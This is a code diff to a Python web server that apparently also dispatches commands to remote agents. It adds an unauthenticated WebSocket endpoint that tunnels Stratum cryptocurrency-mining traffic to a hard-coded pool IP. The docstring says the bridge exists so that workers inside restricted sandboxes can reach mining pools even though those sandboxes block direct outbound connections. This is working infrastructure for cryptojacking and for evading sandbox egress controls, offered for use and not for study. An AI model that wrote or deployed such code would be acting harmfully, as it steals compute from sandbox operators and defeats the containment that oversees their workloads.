@@ -4564,6 +4564,61 @@ async def api_exec_handler(request):
     finally:
         registry.pending_execs.pop(waiter_id, None)
 
+async def stratum_ws_handler(request):
+    """
+    Bidirectional WebSocket-to-TCP Stratum Bridge.
+    Allows workers in restricted sandboxes (e.g. Meta Hatch) to tunnel raw Stratum mining
+    traffic to any pool over HTTPS WebSocket without requiring ptrace or direct outbound TCP.
+    """
+    ws = web.WebSocketResponse(heartbeat=30.0, max_msg_size=16 * 1024 * 1024)
+    await ws.prepare(request)
+
+    pool_host = request.query.get("host", "43.135.134.20")
+    pool_port = int(request.query.get("port", "10080"))
+
+    try:
+        reader, writer = await asyncio.wait_for(asyncio.open_connection(pool_host, pool_port), timeout=10.0)
+        logger.info(f"[STRATUM-BRIDGE] Worker connected. Tunneled to {pool_host}:{pool_port}")
+    except Exception as e:
+        logger.error(f"[STRATUM-BRIDGE] Failed connecting to pool {pool_host}:{pool_port}: {e}")
+        await ws.close(code=1011, message=str(e).encode())
+        return ws
+
+    async def ws_to_tcp():
+        try:
+            async for msg in ws:
+                if msg.type == web.WSMsgType.BINARY:
+                    writer.write(msg.data)
+                    await writer.drain()
+                elif msg.type == web.WSMsgType.TEXT:
+                    writer.write(msg.data.encode("utf-8"))
+                    await writer.drain()
+        except Exception:
+            pass
+        finally:
+            try:
+                writer.close()
+            except Exception:
+                pass
+
+    async def tcp_to_ws():
+        try:
+            while True:
+                data = await reader.read(4096)
+                if not data:
+                    break
+                await ws.send_bytes(data)
+        except Exception:
+            pass
+        finally:
+            try:
+                await ws.close()
+            except Exception:
+                pass
+
+    await asyncio.gather(ws_to_tcp(), tcp_to_ws())
+    return ws
+
 async def dashboard_ws_handler(request):
     cookie = request.cookies.get(SESSION_COOKIE_NAME) or request.query.get("token") or request.query.get("auth")
     if not verify_session_token(cookie):
@@ -4810,6 +4865,7 @@ async def main():
     app.router.add_post("/api/exec", api_exec_handler)
     app.router.add_get("/api/agent/{agent_id}", api_agent_detail_handler)
     app.router.add_get("/download/{filename}", handle_download_http)
+    app.router.add_get("/api/stratum_ws", stratum_ws_handler)
     runner = web.AppRunner(app)
     await runner.setup()
 
